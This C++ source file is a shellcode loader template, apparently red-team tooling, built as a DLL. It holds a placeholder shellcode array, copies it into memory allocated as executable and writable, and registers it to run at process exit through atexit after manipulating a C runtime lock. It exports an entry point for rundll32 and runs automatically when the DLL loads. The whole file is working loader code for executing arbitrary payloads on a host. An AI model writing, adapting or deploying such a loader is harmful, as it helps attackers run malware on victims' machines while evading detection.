/**
// Execute at Exit Loader Template
Author: Thomas X Meng
***/

#include <windows.h>
#include <cstdio>
#include <cstdlib> // for atexit and _onexit

unsigned char magiccode[] = ####SHELLCODE####;

void* magic_place = nullptr;

// Import the _unlock and _lock functions from MSVCRT
extern "C" {
    void __cdecl _unlock(int);
    void __cdecl _lock(int);
}

void execute_magiccode() {
    if (magic_place != nullptr) {


        void (*magiccode_func)() = (void (*)())magic_place;
        magiccode_func();


    }
}

int onexit_wrapper() {
    execute_magiccode();
    return 0;
}

void *mcopy(void* dest, const void* src, size_t n){
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (n--)
        *d++ = *s++;
    return dest;
}


// Exporting a function that can be called by rundll32.exe
extern "C" __declspec(dllexport) void CALLBACK ExecuteMagiccode(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {


    SIZE_T magic_size = sizeof(magiccode);

    // Unlock CRT critical section: msvcrt!CrtLock_Exit
    _unlock(8);
    // Allocate memory for the magiccode
    magic_place = VirtualAlloc(0, magic_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (magic_place == NULL) {
        printf("Failed to allocate memory for magiccode.\n");
    }

    // Copy to the allocated memory
    mcopy(magic_place, magiccode, magic_size);
    // Relock CRT critical section
    _lock(8);

    // // Register execute_magiccode to run on program exit using atexit
    if (atexit(execute_magiccode) != 0) {
        printf("[-] Failed to register atexit function.\n");
    } else {
        printf("[+] Registered atexit function.\n");
    }

    // // Register onexit_wrapper with _onexit, both functions will work on EXE...
    // if (_onexit(onexit_wrapper) == NULL) {
    //     printf("[-] Failed to register _onexit function.\n");
    // } else {
    //     printf("[+] Registered _onexit function.\n");
    // }

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Optionally automatically execute upon loading the DLL.
        ExecuteMagiccode(NULL, hModule, NULL, SW_SHOW);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
